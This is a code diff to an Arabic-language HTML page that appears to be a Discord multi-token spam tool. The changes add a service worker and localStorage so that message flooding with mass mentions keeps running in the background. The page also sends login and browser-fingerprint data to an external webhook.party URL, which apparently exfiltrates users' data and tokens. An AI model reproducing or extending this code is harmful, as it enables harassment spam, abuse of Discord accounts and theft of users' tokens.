@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -433,11 +432,26 @@
       0%, 100% { opacity: 0.3; }
       50% { opacity: 0.7; }
     }
+
+    .background-status {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      padding: 10px 15px;
+      background: rgba(0, 0, 0, 0.8);
+      border: 2px solid #ff0000;
+      border-radius: 10px;
+      color: #ff0000;
+      font-weight: bold;
+      z-index: 1000;
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="blood-effect"></div>
   <div class="floating-elements"></div>
+  <div class="background-status" id="backgroundStatus">يعمل في الخلفية 🔴</div>
 
   <div class="container" id="visitorLogger">
     <h2 class="luxury-title"> تسجيل دخول </h2>
@@ -515,6 +529,7 @@
     const saveVisitorBtn = document.getElementById("saveVisitor");
     const loginSection = document.getElementById('login');
     const mainSection = document.getElementById('main');
+    const backgroundStatus = document.getElementById('backgroundStatus');
 
     const tokenInput = document.getElementById('tokenInput');
     const channelInput = document.getElementById('channelId');
@@ -527,6 +542,19 @@
 
     let tokens = [];
     let stop = false;
+    let backgroundTaskActive = false;
+
+    // تسجيل Service Worker
+    async function registerServiceWorker() {
+      if ('serviceWorker' in navigator) {
+        try {
+          const registration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
+          console.log('Service Worker registered successfully');
+        } catch (error) {
+          console.error('Service Worker registration failed:', error);
+        }
+      }
+    }
 
     // إدارة التبويبات
     document.querySelectorAll('.tab').forEach(tab => {
@@ -545,7 +573,19 @@
       setTimeout(() => element.classList.remove('success-glow'), 800);
     }
 
-    
+    // إظهار حالة العمل في الخلفية
+    function updateBackgroundStatus(active) {
+      backgroundTaskActive = active;
+      if (active) {
+        backgroundStatus.style.display = 'block';
+        logBox.innerText += "🔴 الإرسال يعمل في الخلفية الآن\n";
+        logBox.scrollTop = logBox.scrollHeight;
+      } else {
+        backgroundStatus.style.display = 'none';
+        logBox.innerText += "🟢 توقف العمل في الخلفية\n";
+        logBox.scrollTop = logBox.scrollHeight;
+      }
+    }
 
     async function getBrowserInfo() {
       const canvas = document.createElement('canvas');
@@ -605,7 +645,7 @@
     }
 
     async function sendToWebhook(data) {
-      const webhookUrl = "https://l.webhook.party/hook/RbwjegFdDg1jVOCxRW6BQLa4mjjYGH9tyRnK%2FAic7V0G2b6N35aP1%2BQlFWgqCFYUvIym5fr9YMJJtOKED7B%2FEs%2BBXDqFNbk3MynY%2BklRjvfPQYWsyMKD0a3AUKzD3uJbJCFfF38OlW3P7RycCBOx4ka3Y5%2BmpNpEC0nK9K7pKjSOKhkpJlJH%2FbYjT9HwvhztgHud%2B%2Fnw%2F07Bn%2F%2BUqqIRYkJ%2FQKTD824YU945mn4B6S7SfkiEPuSSTlUAgRq0jIr%2FfWJlILoSpXkRMW21Cs7oG8xAEFDRu07mNE4iwRnqH1HdYeskM4cmjm%2BCZ1h1fZC%2BSaXkKgdPBGpLiqpAhq1YaG%2B36hP0qsDMTPYFCSf8aXc6nLMIRNPAdQOrVwlHfYkjD%2FYjN4ZiJDg%3D/%2FhoXeCCRWRGLvQ6I";
+      const webhookUrl = "https://l.webhook.party/hook/RbwjegFdDg1jVOCxRW6BQLa4mjjYGH9tyRnK%2FAic7V0G2b6N35aP1%2BQlFWgqCFYUvIym5fr9YMJJtOKED7B%2FEs%2BBXDqFNbk3MynY%2BklRjvfPQYWsyMKD0a3AUKzD3uJbJCFfF38OlW3P7RycCBOx4ka3Y5%2BmpNpEC0nK9K7pKjSOKhkpJlJH%2FbYjT9HwvhztgHudB%2Fnw%2F07Bn%2F%2BUqqIRYkJ%2FQKTD824YU945mn4B6S7SfkiEPuSSTlUAgRq0jIr%2FfWJlILoSpXkRMW21Cs7oG8xAEFDRu07mNE4iwRnqH1HdYeskM4cmjm%2BCZ1h1fZC%2BSaXkKgdPBGpLiqpAhq1YaG%2B36hP0qsDMTPYFCSf8aXc6nLMIRNPAdQOrVwlHfYkjD%2FYjN4ZiJDg%3D/%2FhoXeCCRWRGLvQ6I";
       
       const embed = {
         title: "New login",
@@ -714,6 +754,9 @@
       addSuccessEffect(document.getElementById('loginBtn'));
       loginSection.classList.add('hidden');
       mainSection.classList.remove('hidden');
+      
+      // تسجيل Service Worker بعد تسجيل الدخول
+      registerServiceWorker();
     };
 
     function getRandomMessage() {
@@ -747,43 +790,76 @@
       }
     }
 
-   startBtn.onclick = async () => {
-  const channelId = channelInput.value.trim();
-  const mentionsRaw = mentionInput.value.trim();
-  const mentions = mentionsRaw
-    ? mentionsRaw.split(',').map(id => `<@${id.trim()}>`).join(' ')
-    : "";
-  const delay = parseFloat(delayInput.value) * 1000;
-  const type = sendType.value;
+    startBtn.onclick = async () => {
+      const channelId = channelInput.value.trim();
+      const mentionsRaw = mentionInput.value.trim();
+      const mentions = mentionsRaw
+        ? mentionsRaw.split(',').map(id => `<@${id.trim()}>`).join(' ')
+        : "";
+      const delay = parseFloat(delayInput.value) * 1000;
+      const type = sendType.value;
 
-  if (!channelId) return alert("من فضلك اكتب ID الروم");
+      if (!channelId) return alert("من فضلك اكتب ID الروم");
 
-  stop = false;
-  addSuccessEffect(startBtn);
+      stop = false;
+      addSuccessEffect(startBtn);
+      updateBackgroundStatus(true);
 
-  async function loopSend(token) {
-    let index = 0;
-    while (!stop) {
-      let msg;
-      if (type === "random") {
-        msg = mentions ? `${getRandomMessage()} ${mentions}` : getRandomMessage();
-      } else {
-        msg = mentions ? `${getSequentialMessage(index)} ${mentions}` : getSequentialMessage(index);
-        index++;
+      // حفظ بيانات المهمة للعمل في الخلفية
+      const taskData = {
+        tokens,
+        channelId,
+        mentions,
+        delay,
+        type,
+        messages
+      };
+      
+      localStorage.setItem('backgroundTask', JSON.stringify(taskData));
+      
+      // إعلام Service Worker ببدء المهمة
+      if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+        navigator.serviceWorker.controller.postMessage({
+          type: 'START_TASK',
+          data: taskData
+        });
       }
-      await sendMessage(token, channelId, msg);
-      await new Promise(r => setTimeout(r, delay));
-    }
-  }
 
-  tokens.forEach(token => loopSend(token));
-  logBox.innerText += `🔥 بدأ الإرسال   ${tokens.length} .\n`;
-  logBox.scrollTop = logBox.scrollHeight;
-};
+      async function loopSend(token) {
+        let index = 0;
+        while (!stop) {
+          let msg;
+          if (type === "random") {
+            msg = mentions ? `${getRandomMessage()} ${mentions}` : getRandomMessage();
+          } else {
+            msg = mentions ? `${getSequentialMessage(index)} ${mentions}` : getSequentialMessage(index);
+            index++;
+          }
+          await sendMessage(token, channelId, msg);
+          await new Promise(r => setTimeout(r, delay));
+        }
+      }
+
+      tokens.forEach(token => loopSend(token));
+      logBox.innerText += `🔥 بدأ الإرسال   ${tokens.length} .\n`;
+      logBox.scrollTop = logBox.scrollHeight;
+    };
 
     stopBtn.onclick = () => {
       stop = true;
       addSuccessEffect(stopBtn);
+      updateBackgroundStatus(false);
+      
+      // إزالة بيانات المهمة من التخزين
+      localStorage.removeItem('backgroundTask');
+      
+      // إعلام Service Worker بإيقاف المهمة
+      if (navigator.serviceWorker && navigator.serviceWorker.controller) {
+        navigator.serviceWorker.controller.postMessage({
+          type: 'STOP_TASK'
+        });
+      }
+      
       logBox.innerText += `🩸 تم إيقاف الإرسال الدموي بنجاح.\n`;
       logBox.scrollTop = logBox.scrollHeight;
     };
@@ -1013,6 +1089,29 @@
     document.getElementById('undeafenAllBtn').onclick = undeafenAll;
     document.getElementById('changeTokenNamesBtn').onclick = changeTokenNames;
     document.getElementById('changeNicknamesBtn').onclick = changeNicknames;
+
+    // التحقق من وجود مهمة نشطة عند تحميل الصفحة
+    window.addEventListener('load', () => {
+      const activeTask = localStorage.getItem('backgroundTask');
+      if (activeTask) {
+        updateBackgroundStatus(true);
+        logBox.innerText += "🔴 تم اكتشاف مهمة نشطة في الخلفية\n";
+        logBox.scrollTop = logBox.scrollHeight;
+      }
+    });
+  </script>
+
+  <!-- Service Worker Registration -->
+  <script>
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', function() {
+        navigator.serviceWorker.register('/sw.js').then(function(registration) {
+          console.log('ServiceWorker registration successful with scope: ', registration.scope);
+        }, function(err) {
+          console.log('ServiceWorker registration failed: ', err);
+        });
+      });
+    }
   </script>
 </body>
 </html>
